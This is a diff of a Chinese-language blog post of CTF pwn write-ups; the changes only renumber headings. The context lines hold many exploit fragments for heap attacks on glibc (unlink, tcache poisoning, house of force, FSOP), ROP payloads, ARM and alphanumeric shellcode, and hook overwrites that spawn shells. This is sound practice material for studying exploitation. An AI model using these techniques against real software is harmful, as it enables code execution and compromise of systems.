+<h4 id="hitcontraining-heapcreator——off-by-one-chunk-overlapping">hitcontraining_heapcreator——off by one+chunk overlapping</h4>
 <p>首先通过堆溢出将0xe5548（size处）的0x21改为0x41，实现off by one。</p>
 <p>注意观察delete与重新add后的堆排布情况。</p>
 <p>delete后，形成了位于0xe5540与0xe55060处的fastbin。</p>
@@ -1402,7 +1403,7 @@ if __name__ == '__main__':
    edit(1, p64(libc_sys))
    delete(0)
 </code></pre>
-<h3 id="roarctf-2019-easy-pwn——off-by-one-realloc-hook">roarctf_2019_easy_pwn——off by one+realloc_hook</h3>
+<h4 id="roarctf-2019-easy-pwn——off-by-one-realloc-hook">roarctf_2019_easy_pwn——off by one+realloc_hook</h4>
 <p>这里由于栈环境的原因，需要使用<code>realloc_hook+4</code>满足<code>one_gadget</code>的条件。</p>
 <p>原理是通过调整push的个数使得<code>[rsp+0x70]</code>恰好对到全0的位置。</p>
 <p>如下所示，gdb在calloc(realloc_hook+4)函数下断点，运行至此查看[rsp+0x70]附近的值：</p>
@@ -1469,7 +1470,7 @@ Dump of assembler code for function __GI___libc_realloc:
    edit(8, 0x1b, b'a'*11 + p64(one_gadget) + p64(realloc_hook+4))
    add(0x68)
 </code></pre>
-<h3 id="hitcon-stkof——unlink">hitcon_stkof——unlink</h3>
+<h4 id="hitcon-stkof——unlink">hitcon_stkof——unlink</h4>
 <p>unlink部分，fake_chunk构造公式如下：</p>
 <ul>
 <li>
@@ -1507,7 +1508,7 @@ Dump of assembler code for function __GI___libc_realloc:
    edit(4, 8, '/bin/sh\0')
    free(4)
 </code></pre>
-<h3 id="hitcontraining-bamboobox——unlink-house-of-force">hitcontraining_bamboobox——unlink/house of force</h3>
+<h4 id="hitcontraining-bamboobox——unlink-house-of-force">hitcontraining_bamboobox——unlink/house of force</h4>
 <p>这道题的创建与编辑的字符串会有后置0，算一个off by null（同时它也成了调试的障碍），然而更主要的漏洞是堆溢出。</p>
 <p>unlink 解法（不使用提供的后门）：</p>
 <pre><code class="language-python">def exploit():
@@ -1600,7 +1601,7 @@ Dump of assembler code for function __GI___libc_realloc:
    MINSIZE :                                                      \
    ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)
 </code></pre>
-<h3 id="lctf2016-pwn200——house-of-spirit">lctf2016_pwn200——house of spirit</h3>
+<h4 id="lctf2016-pwn200——house-of-spirit">lctf2016_pwn200——house of spirit</h4>
 <blockquote>
 <p>house of spirit的要点主要有以下几点：</p>
 <ul>
@@ -1649,7 +1650,7 @@ Dump of assembler code for function __GI___libc_realloc:
 
    io.sendline('3')
 </code></pre>
-<h3 id="houseoforange-hitcon-2016——unsortedbin-attack-fsop">houseoforange_hitcon_2016——unsortedbin attack+fsop</h3>
+<h4 id="houseoforange-hitcon-2016——unsortedbin-attack-fsop">houseoforange_hitcon_2016——unsortedbin attack+fsop</h4>
 <blockquote>
 <p>原题<code>edit</code>函数中，对长度不做检查，可以堆溢出。同时也对<code>add</code>与<code>edit</code>次数做了限制。</p>
 </blockquote>
@@ -1763,7 +1764,7 @@ struct _IO_FILE_complete
    
    io.sendline('1')
 </code></pre>
-<h3 id="axb-2019-heap——fmtstr-off-by-one-unlink">axb_2019_heap——fmtstr+off by one+unlink</h3>
+<h4 id="axb-2019-heap——fmtstr-off-by-one-unlink">axb_2019_heap——fmtstr+off by one+unlink</h4>
 <p>堆与格式化字符串的小综合。</p>
 <blockquote>
 <p>buu第三页完结撒花~</p>
@@ -1791,7 +1792,7 @@ struct _IO_FILE_complete
    edit(0, p64(libc_sys))
    dele(1)
 </code></pre>
-<h3 id="zctf2016-note2——int-overflow-unlink">zctf2016_note2——int overflow+unlink</h3>
+<h4 id="zctf2016-note2——int-overflow-unlink">zctf2016_note2——int overflow+unlink</h4>
 <p>edit函数中存在整数溢出漏洞：</p>
 <pre><code class="language-c">unsigned __int64 __fastcall read_0(char *a1, __int64 len, char stop)
 &#123;
@@ -1838,7 +1839,7 @@ struct _IO_FILE_complete
 
    edit(0, ';sh\0') # there is a free func in edit func
 </code></pre>
-<h3 id="gyctf-2020-force——house-of-force-realloc-hook">gyctf_2020_force——house of force+realloc_hook</h3>
+<h4 id="gyctf-2020-force——house-of-force-realloc-hook">gyctf_2020_force——house of force+realloc_hook</h4>
 <p>开始直接把<code>__malloc_hook</code>覆盖成<code>one_gadget</code>,结果又炸了。（ogg天天出锅）</p>
 <p>然后直接上<code>realloc</code>，随缘push了几个寄存器就好了。</p>
 <p>可以参考这位师傅的文章来了解<code>one_gadget</code>可以利用的条件：<a target="_blank" rel="noopener" href="http://taqini.space/2020/04/29/about-execve/">http://taqini.space/2020/04/29/about-execve/</a></p>
@@ -1871,7 +1872,7 @@ struct _IO_FILE_complete
 06:0030│ rsi 0x7ffca061dce0 —▸ 0x7ffca061e030 ◂— 0x1
 07:0038│     0x7ffca061dce8 ◂— 0x0
 </code></pre>
-<h3 id="zctf-2016-note3——int-overflow-unlink-no-show">zctf_2016_note3——int overflow+unlink+no show</h3>
+<h4 id="zctf-2016-note3——int-overflow-unlink-no-show">zctf_2016_note3——int overflow+unlink+no show</h4>
 <p>跟note2差不多，先堆溢出后unlink，然后修改堆指针到<code>free.got</code>编辑它为<code>puts.plt</code>。</p>
 <p>随便拿一个函数（如atoi）的got，free一下，泄露libc地址。最后<code>one_gadget</code>或<code>system</code>改<code>atoi.got</code>和<code>free.got</code>都可以。</p>
 <pre><code class="language-python">def exploit():
@@ -1886,8 +1887,8 @@ struct _IO_FILE_complete
    edit(2, p64(one_gadget)[:-1])
    dele(0)
 </code></pre>
-<h2 id="libc-2-27">libc 2.27</h2>
-<h3 id="libc-2-27-uaf-buu-n1book-note">libc 2.27 uaf (buu-n1book: note)</h3>
+<h3 id="libc-2-27">libc 2.27</h3>
+<h4 id="libc-2-27-uaf-buu-n1book-note">libc 2.27 uaf (buu-n1book: note)</h4>
 <p>存在明显的uaf与double free漏洞。</p>
 <p>仍然是将tcache填满再进行普通的unsortedbin attack。</p>
 <pre><code class="language-python">def exploit():
@@ -1930,7 +1931,7 @@ add(0x30,p64(system)+'\n')
 add(0x30,p64(system)+'\n')
 dele(3)
 </code></pre>
-<h3 id="ciscn-2019-n-3——heap-fengshui">ciscn_2019_n_3——heap fengshui</h3>
+<h4 id="ciscn-2019-n-3——heap-fengshui">ciscn_2019_n_3——heap fengshui</h4>
 <p>有些题解说这是fastbin attack，实际上这道题是tcache(libc 2.27)的堆风水，因此跟fastbin毫无关系。</p>
 <pre><code class="language-python">def exploit():
    add(0, 0x40, 'aaaa')
@@ -1979,7 +1980,7 @@ dele(3)
 </code></pre>
 <p>可见<code>add(0xc)</code>时将<code>rec_str_free()</code>，也就是<code>records[0] + 4</code>改为了<code>system()</code>的plt，而<code>records[v0]</code>作为了<code>sh</code>的地址。</p>
 <p>从而在<code>free(0)</code>时相当于执行<code>system('sh')</code>，从而拿到了shell。</p>
-<h3 id="npuctf-2020-easyheap——off-by-one-chunk-overlap">npuctf_2020_easyheap——off by one+chunk overlap</h3>
+<h4 id="npuctf-2020-easyheap——off-by-one-chunk-overlap">npuctf_2020_easyheap——off by one+chunk overlap</h4>
 <pre><code class="language-python">def exploit():
    add(0x18, 'a'*0x18) #0   
    add(0x18, 'b'*0x18) #1
@@ -1996,7 +1997,7 @@ dele(3)
    edit(1, p64(libc_sys))
    free(2)
 </code></pre>
-<h3 id="hitcontraining-magicheap——unsorted-bin-attack">hitcontraining_magicheap——unsorted bin attack</h3>
+<h4 id="hitcontraining-magicheap——unsorted-bin-attack">hitcontraining_magicheap——unsorted bin attack</h4>
 <p>unsorted bin attack的核心是篡改bk指针为任意地址，使得该地址为一个很大的数。</p>
 <pre><code class="language-python">def exploit():
    add(0x500, 'aaaa')
@@ -2008,7 +2009,7 @@ dele(3)
    add(0x500, '\0')
    io.sendline('4869')
 </code></pre>
-<h3 id="ciscn-2019-final-3——tcache-dup">ciscn_2019_final_3——tcache dup</h3>
+<h4 id="ciscn-2019-final-3——tcache-dup">ciscn_2019_final_3——tcache dup</h4>
 <p>知识点不难，但是做起来比较棘手。</p>
 <p>一个重要的点是如果tcache与unsortedbin指针相同，先free tcache，再free unsortedbin，从而两次malloc后可以分配到libc地址。</p>
 <pre><code class="language-python">def exploit():
@@ -2042,7 +2043,7 @@ dele(3)
 
    dele(10)
 </code></pre>
-<h3 id="hitcon-2018-children-tcache——off-by-null">hitcon_2018_children_tcache——off by null</h3>
+<h4 id="hitcon-2018-children-tcache——off-by-null">hitcon_2018_children_tcache——off by null</h4>
 <p>经典夹心法。</p>
 <pre><code class="language-python">def exploit():
    add(0x438, 'a') #0
@@ -2074,7 +2075,7 @@ dele(3)
    add(0x38, p64(one_gadget))
    dele(3)
 </code></pre>
-<h3 id="gyctf-2020-signin——tcache-calloc">gyctf_2020_signin——tcache&amp;calloc</h3>
+<h4 id="gyctf-2020-signin——tcache-calloc">gyctf_2020_signin——tcache&amp;calloc</h4>
 <p>calloc 有以下特性：</p>
 <ul>
 <li>不会分配 tcache chunk 中的 chunk 。</li>
@@ -2096,7 +2097,7 @@ dele(3)
    backdoor() # and the target will become fd of 6th tcache bin
 </code></pre>
 <img src = 'https://img.junyu33.me/blog/bin_ctf/image-20220904123230378.png'>
-<h3 id="ciscn-2019-final-5——overflow-unlink-no-show">ciscn_2019_final_5——overflow+unlink+no show</h3>
+<h4 id="ciscn-2019-final-5——overflow-unlink-no-show">ciscn_2019_final_5——overflow+unlink+no show</h4>
 <p>强行与zctf_2016_note3的做法对接。</p>
 <ul>
 <li>逻辑漏洞导致堆溢出</li>
@@ -2144,7 +2145,7 @@ dele(3)
    edit(7, p64(0)+p64(libc_base+libc.sym['system']))
    dele(3)
 </code></pre>
-<h3 id="roarctf-2019-realloc-magic——realloc-stdout-tcache-poisoning">roarctf_2019_realloc_magic——realloc+stdout+tcache_poisoning</h3>
+<h4 id="roarctf-2019-realloc-magic——realloc-stdout-tcache-poisoning">roarctf_2019_realloc_magic——realloc+stdout+tcache_poisoning</h4>
 <blockquote>
 <p>对于leak部分,如果一个题有show当然是最好的.</p>
 <p>如果没有show的话但没开<code>PIE</code>,可以尝试把<code>free.got</code>改成<code>puts.plt/printf.plt</code>.</p>
@@ -2214,7 +2215,7 @@ dele(3)
    realloc(0x98, b'/bin/sh\0' + p64(libc_sys))
    dele()
 </code></pre>
-<h3 id="sctf-2019-easy-heap——unlink-stdout-tcache-poisoning">sctf_2019_easy_heap——unlink+stdout+tcache_poisoning</h3>
+<h4 id="sctf-2019-easy-heap——unlink-stdout-tcache-poisoning">sctf_2019_easy_heap——unlink+stdout+tcache_poisoning</h4>
 <p>mmap没用上，直接暴力打<code>stdout</code></p>
 <p>先tcache free一波，然后改size后free到unsortedbin，tcache_poisoning改成<code>stdout</code>。之后的思路就跟上一题差不多了。</p>
 <pre><code class="language-python">def exploit():
@@ -2265,7 +2266,7 @@ dele(3)
    edit(3, b'/bin/sh\x00' + b'\n')
    dele(3)
 </code></pre>
-<h3 id="SWPUCTF-2019-p1KkHeap——tcache-perthread-struct-orw">SWPUCTF_2019_p1KkHeap——tcache_perthread_struct+orw</h3>
+<h4 id="SWPUCTF-2019-p1KkHeap——tcache-perthread-struct-orw">SWPUCTF_2019_p1KkHeap——tcache_perthread_struct+orw</h4>
 <p>tcache_perthread_struct有两个功能：</p>
 <ul>
 <li>前64个字节改cnt（从2.29之后是128个字节）</li>
@@ -2311,8 +2312,8 @@ dele(3)
    edit(6, p64(0x66660000))
    add(0x78) # 7
 </code></pre>
-<h2 id="libc-2-29-libc-2-27-3ubuntu1-3-without-tcache-dup">libc 2.29 (&gt;=libc 2.27-3ubuntu1.3, without tcache_dup)</h2>
-<h3 id="巅峰极客gift——heap-fengshui-tcache-poisoning">巅峰极客gift——heap fengshui+tcache poisoning</h3>
+<h3 id="libc-2-29-libc-2-27-3ubuntu1-3-without-tcache-dup">libc 2.29 (&gt;=libc 2.27-3ubuntu1.3, without tcache_dup)</h3>
+<h4 id="巅峰极客gift——heap-fengshui-tcache-poisoning">巅峰极客gift——heap fengshui+tcache poisoning</h4>
 <p>我开始是直接按照<code>tcache_dup</code>做的，然后发现libc 2.27现在也不支持辣！</p>
 <blockquote>
 <p>现今版本，2020年09月10日开始，从2.27-3ubuntu1.3开始，就已经对tcache做了部分修改，很接近2.29的，而现在的题目基本都是基于这种增强型版本的，已经不存在double free了。</p>
@@ -2359,13 +2360,13 @@ dele(3)
 
    dele(3)
 </code></pre>
-<h3 id="2020-新春红包题-3——tcache-stashing-unlink-attack-orw-rop">[2020 新春红包题]3——tcache stashing unlink attack+orw rop</h3>
-<h4 id="攻击目标">攻击目标</h4>
+<h4 id="2020-新春红包题-3——tcache-stashing-unlink-attack-orw-rop">[2020 新春红包题]3——tcache stashing unlink attack+orw rop</h4>
+<h5 id="攻击目标">攻击目标</h5>
 <ol>
 <li>向任意指定位置写入指定值。</li>
 <li>向任意地址分配一个Chunk。</li>
 </ol>
-<h4 id="攻击前提">攻击前提</h4>
+<h5 id="攻击前提">攻击前提</h5>
 <ol>
 <li>能控制 Small Bin Chunk 的 bk 指针。</li>
 <li>程序可以越过Tache取Chunk。(使用calloc即可做到)</li>
@@ -2443,7 +2444,7 @@ dele(3)
 <p>这里将<code>flag</code>换成<code>links.txt</code>后，有一个链接 <a target="_blank" rel="noopener" href="https://buuoj.cn/files/192c547dae7b582f8b5b4665e0ad3a1d/akiwuhwh">https://buuoj.cn/files/192c547dae7b582f8b5b4665e0ad3a1d/akiwuhwh</a></p>
 <p>可惜它404了</p>
 </blockquote>
-<h3 id="hitcon-ctf-2019-one-punch-man——tcache-stashing-unlink-attack-orw-rop2">hitcon_ctf_2019_one_punch_man——tcache stashing unlink attack+orw rop2</h3>
+<h4 id="hitcon-ctf-2019-one-punch-man——tcache-stashing-unlink-attack-orw-rop2">hitcon_ctf_2019_one_punch_man——tcache stashing unlink attack+orw rop2</h4>
 <p>关于unlink attack部分，这里浓缩一下过程：</p>
 <ul>
 <li>创造六个0x100的tcache</li>
@@ -2531,8 +2532,8 @@ def exploit():
    pause()
    add(0, my_orw)
 </code></pre>
-<h2 id="libc-2-35">libc 2.35</h2>
-<h3 id="corctf2022-cshell2——heap-overflow-decrypt-safe-linking-tcache-poisoning">corctf2022_cshell2——heap overflow+decrypt safe-linking+tcache poisoning</h3>
+<h3 id="libc-2-35">libc 2.35</h3>
+<h4 id="corctf2022-cshell2——heap-overflow-decrypt-safe-linking-tcache-poisoning">corctf2022_cshell2——heap overflow+decrypt safe-linking+tcache poisoning</h4>
 <p>io难调得要命，搞不好就会出现<code>sh: 1: 2: not found</code>这种离成功近在咫尺的错误。</p>
 <p>甚至不能调试！！！</p>
 <p>讽刺的是：<code>corctf&#123;m0nk3y1ng_0n_4_d3bugg3r_15_th3_b35T!!!&#125;</code></p>
@@ -2589,8 +2590,8 @@ def exploit():
    io.send(p64(libc_base+libc.sym['scanf'])) # keeping the same
    dele(0)
 </code></pre>
-<h1>arm</h1>
-<h2 id="jarvisoj-typo——arm-rop">jarvisoj_typo——arm rop</h2>
+<h2 id="arm">arm</h2>
+<h3 id="jarvisoj-typo——arm-rop">jarvisoj_typo——arm rop</h3>
 <p>arm寄存器介绍：</p>
 <table>
 <thead>
@@ -2692,7 +2693,7 @@ if __name__ == '__main__':
    io.interactive()
    io.close()
 </code></pre>
-<h2 id="shanghai2018-baby-arm——arm-ret2csu-vmprotect">shanghai2018_baby_arm——arm ret2csu+vmprotect</h2>
+<h3 id="shanghai2018-baby-arm——arm-ret2csu-vmprotect">shanghai2018_baby_arm——arm ret2csu+vmprotect</h3>
 <p>aarch64寄存器介绍：</p>
 <table>
 <thead>
@@ -2834,7 +2835,7 @@ if __name__ == '__main__':
 
    io.sendline(payload)   
 </code></pre>
-<h2 id="inctf2018-wARMup——arm-shellcode">inctf2018_wARMup——arm shellcode</h2>
+<h3 id="inctf2018-wARMup——arm-shellcode">inctf2018_wARMup——arm shellcode</h3>
 <p>注意arm架构中的bss段是可执行的，可以直接在bss段上布置shellcode。</p>
 <p>本来想用shellcraft的，结果出锅了，随便从网上扒了一段shellcode就过了，但是本地过不了。</p>
 <p><code>b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78'</code></p>
@@ -2871,15 +2872,15 @@ if __name__ == '__main__':
    io.interactive()
    io.close()
 </code></pre>
-<h1>misc</h1>
-<h2 id="cicsn-2019-ne-5——sh">cicsn_2019_ne_5——sh</h2>
+<h2 id="misc">misc</h2>
+<h3 id="cicsn-2019-ne-5——sh">cicsn_2019_ne_5——sh</h3>
 <p><code>sh</code>跟<code>/bin/sh</code>都可以打开shell。</p>
 <pre><code class="language-bash">ROPgadget --binary pwn --string 'sh' 
 </code></pre>
 <p>payload结构：</p>
 <pre><code class="language-python">b'a'*(0x48+4) + p32(sys_addr) + p32(main_addr) + p32(bin_sh)
 </code></pre>
-<h2 id="jarvisoj-level3——find-bin-sh-using-pyscript">jarvisoj_level3——find /bin/sh using pyscript</h2>
+<h3 id="jarvisoj-level3——find-bin-sh-using-pyscript">jarvisoj_level3——find /bin/sh using pyscript</h3>
 <pre><code class="language-python">def exploit():
    #libc = ELF('./libc/libc-2.30.so')
    libc = ELF('./libc/libc-2.23.so')
@@ -2903,12 +2904,12 @@ if __name__ == '__main__':
    payload2 = b'a'*140 + p32(sys) + p32(vuln) + p32(bin_sh)
    io.send(payload2)
 </code></pre>
-<h2 id="ez-pz-hackover-2016——cyclic-find-offset">ez_pz_hackover_2016——cyclic find offset</h2>
+<h3 id="ez-pz-hackover-2016——cyclic-find-offset">ez_pz_hackover_2016——cyclic find offset</h3>
 <p>因为有时ida的分析也是错的。</p>
 <p><code>cyclic 50</code>生成长度为50的字符串序列。</p>
 <p>当<code>gdb-peda</code>动调时<code>segmentation fault</code>，可以通过截取<code>ebp</code>对应的字符串来确定输入位置到<code>ebp</code>的偏移。</p>
 <p><code>cyclic -l 'xxxx'</code>得到结果加4或者8就是应该填充的大小。</p>
-<h2 id="pwnable-orw">pwnable_orw</h2>
+<h3 id="pwnable-orw">pwnable_orw</h3>
 <blockquote>
 <p>orw就是指你的系统调用被禁止了，不能通过子进程去获得权限和flag，只能在该进程通过 open , read ,write来得到flag.</p>
 <p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。
@@ -2968,7 +2969,7 @@ p.sendlineafter('shellcode:', shellcode)
 
 p.interactive()
 </code></pre>
-<h2 id="ZJCTF-2019-Login">[ZJCTF 2019]Login</h2>
+<h3 id="ZJCTF-2019-Login">[ZJCTF 2019]Login</h3>
 <blockquote>
 <p>小技巧：在伪代码的页面按Tab可以切换到汇编代码。</p>
 </blockquote>
@@ -3057,11 +3058,11 @@ _Z16password_checkerPFvvE endp
 </code></pre>
 <p>可以看到返回值是<code>[rbp+var_18]</code>。</p>
 <p>由于这几个函数都是<code>main</code>的同一级子函数，所以栈的相对位置不会改变，可以在输入密码的时候将<code>[rbp+var_18]</code>溢出为shell的地址，从而拿到shell。</p>
-<h2 id="wustctf2020-closed">wustctf2020_closed</h2>
+<h3 id="wustctf2020-closed">wustctf2020_closed</h3>
 <p>close（1）关闭了标准输出，close（2）关闭了标准错误，我们只剩下标准输入，并且看到程序会返回shell（0是标准输入，1是标准输出，2是标准错误）。</p>
 <p>将标准输出重定向到标准输入即可得到flag。</p>
 <p><code>exec 1&gt;&amp;0</code></p>
-<h2 id="mrctf2020-shellcode-revenge——alphanumeric-shellcode">mrctf2020_shellcode_revenge——alphanumeric shellcode</h2>
+<h3 id="mrctf2020-shellcode-revenge——alphanumeric-shellcode">mrctf2020_shellcode_revenge——alphanumeric shellcode</h3>
 <p>可使用alpha3生成或导入AE64库。</p>
 <p>参考链接：<a target="_blank" rel="noopener" href="http://taqini.space/2020/03/31/alpha-shellcode-gen/#%E7%94%9F%E6%88%90shellcode">http://taqini.space/2020/03/31/alpha-shellcode-gen/#生成shellcode</a></p>
 <pre><code class="language-python">def exploit():
@@ -3069,7 +3070,7 @@ _Z16password_checkerPFvvE endp
    alpha_shellcode = AE64().encode(shellcode)
    io.send(alpha_shellcode)
 </code></pre>
-<h2 id="hctf2018-the-end——io-file-attack">hctf2018_the_end——io_file attack</h2>
+<h3 id="hctf2018-the-end——io-file-attack">hctf2018_the_end——io_file attack</h3>
 <p>开始打算在libc 2.23的本地伪造vtable，将<code>setbuf</code>改为<code>one_gadget</code>来getshell，然后gdb调试说确实拿到shell了，但是啥回显也没有。</p>
 <pre><code class="language-python">def exploit():
    io.recvuntil('gift ')
@@ -3128,7 +3129,7 @@ _Z16password_checkerPFvvE endp
 </li>
 </ul>
 </blockquote>
-<h2 id="ciscn-2019-n-7——exit-hook-attack">ciscn_2019_n_7——exit_hook attack</h2>
+<h3 id="ciscn-2019-n-7——exit-hook-attack">ciscn_2019_n_7——exit_hook attack</h3>
 <p>libc 2.23与2.27中<code>exit_hook</code>偏移</p>
 <blockquote>
 <p>update on 2022/10/17:</p>
@@ -3156,7 +3157,7 @@ exit_hook = libc_base + 0x619060 + 3848
    io.sendline('4')
    # exec 1&gt;&amp;0 cat flag
 </code></pre>
-<h2 id="wdb2018-GUESS——fork-libc-to-stack">wdb2018_GUESS——fork+libc to stack</h2>
+<h3 id="wdb2018-GUESS——fork-libc-to-stack">wdb2018_GUESS——fork+libc to stack</h3>
 <p>这个程序使用了<code>fork</code>函数，<code>fork</code>的作用是将原程序的内存原封不动地复制给子进程（包括执行流），因此栈地址、libc地址都是不会变的。</p>
 <p>当程序修改canary之后会报错退出，并打印程序的路径，我们可以修改这个路径对应的地址(1)来达到一些目的，具体如下：</p>
 <ul>
@@ -3181,7 +3182,7 @@ exit_hook = libc_base + 0x619060 + 3848
    payload = b'a'*0x128 + p64(flag_addr)
    io.sendline(payload)
 </code></pre>
-<h2 id="ciscn-2019-final-2——modify-file-descriptor">ciscn_2019_final_2——modify file descriptor</h2>
+<h3 id="ciscn-2019-final-2——modify-file-descriptor">ciscn_2019_final_2——modify file descriptor</h3>
 <p>这个题的沙箱全关，故不能使用orw。</p>
 <pre><code class="language-sh"># junyu33 @ zjy in ~/tmp [11:21:25]
 $ seccomp-tools dump ./ciscn_final_2
@@ -3254,10 +3255,10 @@ $ seccomp-tools dump ./ciscn_final_2
    add(1, 666)
    leave('ok')
 </code></pre>
-<h2 id="actf-2019-babyheap——avoid-forking-child-process">actf_2019_babyheap——avoid forking child process</h2>
+<h3 id="actf-2019-babyheap——avoid-forking-child-process">actf_2019_babyheap——avoid forking child process</h3>
 <pre><code class="language-python">gdb.attach(io, 'set follow-fork-mode parent')
 </code></pre>
-<h2 id="hfctf-2020-marksman——exit-hook-attack2">hfctf_2020_marksman——exit_hook attack2</h2>
+<h3 id="hfctf-2020-marksman——exit-hook-attack2">hfctf_2020_marksman——exit_hook attack2</h3>
 <blockquote>
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14687617.html">https://www.cnblogs.com/LynneHuan/p/14687617.html</a></p>
 </blockquote>
@@ -3276,7 +3277,7 @@ $ seccomp-tools dump ./ciscn_final_2
    io.sendline(p8((one_gadget&gt;&gt;8)&amp;0xff))
    io.sendline(p8((one_gadget&gt;&gt;16)&amp;0xff))
 </code></pre>
-<h2 id="OGeek2019-Final-OVM——vm">[OGeek2019 Final]OVM——vm</h2>
+<h3 id="OGeek2019-Final-OVM——vm">[OGeek2019 Final]OVM——vm</h3>
 <p>vm pwn与vm reverse不同的地方在于你不必逆向所有的指令，只需要注意有漏洞的指令（主要为数组越界），然后以这个指令的利用为中心去逆其它用的上的指令就行。不用一股脑的把所有的opcode对应的python函数写好，浪费时间。</p>
 <p>本题的0x30 opcode与0x40 opcode存在数组越界，因此可以任意地址读写。由于comment是堆分配的地址，简单的做法是通过stderr获得libc的地址，从而把堆指针改为<code>__free_hook</code>，写入<code>one_gadget</code>即可。</p>
 <pre><code class="language-python"># reg13 = sp
@@ -3341,7 +3342,7 @@ def exploit():
    one_gadget = libc_base + 0x4526a
    io.send(p64(one_gadget))
 </code></pre>
-<h2 id="sctf-2019-one-heap——1-256-probability">sctf_2019_one_heap——1/256 probability</h2>
+<h3 id="sctf-2019-one-heap——1-256-probability">sctf_2019_one_heap——1/256 probability</h3>
 <p>思路是double free后控制tcache_perthread_struct，改0x250的cnt后释放本身成为unsorted bin。</p>
 <p>重新分配0x40及以上的大小后，main_arena会向下移动到next指针，partial write爆破stdout泄露libc。</p>
 <p>最后直接在<code>__malloc_hook</code>中写<code>one_gadget</code>和<code>realloc_hook+4</code>即可。</p>
